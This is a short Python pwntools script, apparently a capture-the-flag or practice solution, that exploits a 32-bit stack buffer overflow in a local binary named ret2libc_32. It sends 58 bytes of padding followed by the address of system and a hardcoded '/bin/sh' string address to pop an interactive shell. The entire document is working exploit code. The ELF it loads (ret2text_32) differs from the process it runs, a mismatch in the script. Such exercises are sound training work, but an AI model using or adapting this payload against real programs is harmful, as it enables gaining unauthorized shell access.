from pwn import *

p = process("./ret2libc_32")
elf = ELF("./ret2text_32")

# context.terminal=["tmux","sp","-h"]
# gdb.attach(p)

system = elf.plt['system']

binsh = 0x0804c020
log.success("system addresss = {}".format(hex(system)))
offset = 58
payload = flat(['a'*offset,p32(system),0,p32(binsh)])
p.sendline(payload)
p.interactive()
